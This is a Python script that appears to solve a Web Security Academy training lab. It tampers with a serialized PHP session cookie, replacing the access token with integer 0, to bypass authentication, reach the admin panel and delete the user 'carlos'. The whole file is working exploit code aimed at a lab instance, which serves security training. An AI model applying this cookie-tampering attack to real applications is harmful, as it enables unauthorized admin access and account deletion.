import requests
from urllib.parse import unquote
import base64

url = "https://0acf0043040bf54e80f122cd00880012.web-security-academy.net"

session = requests.Session()

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": f"{url}/login",
    "Origin": f"{url}"
}

cookies = {
    "session": ""
}

data = {
    "username": "wiener",
    "password": "peter"
}

response = session.post(
    f"{url}/login",
    headers=headers,
    cookies=cookies,
    data=data,
)

if "/my-account?id=wiener" in response.text:
    print("Logged in successful!")
else:
    print("Cannot Logged in!")

normalDecodedSessionToken = base64.b64decode(unquote(session.cookies.get("session"))).decode()
print(f"Normal cookie is: {normalDecodedSessionToken}")

changedDecodedSessionToken = normalDecodedSessionToken.replace('"access_token";s:32:"sskydsmvb9jky2fb2uv7r4jcksvtyll3"', '"access_token";i:0')
changedSessionToken = base64.b64encode(changedDecodedSessionToken.encode()).decode()
print(f"Changed cookie is: {changedSessionToken}")


session.cookies.set(
    "session",
    changedSessionToken,
    domain="0acf0043040bf54e80f122cd00880012.web-security-academy.net",
)

changedDashboardResponse = session.get(f"{url}/admin")

if "Admin panel" in changedDashboardResponse.text:
    print("You successfully logged in Admin Panel!")
else:
    print("Admin panel login failed")


delete_response = session.get(
    f"{url}/admin/delete",
    params={"username": "carlos"}
)

if "Congratulations, you solved the lab!" in delete_response.text:
    print("You successfully deleted the Carlos user!")
else:
    print("Deleting process failed!")

print(changedDashboardResponse.text)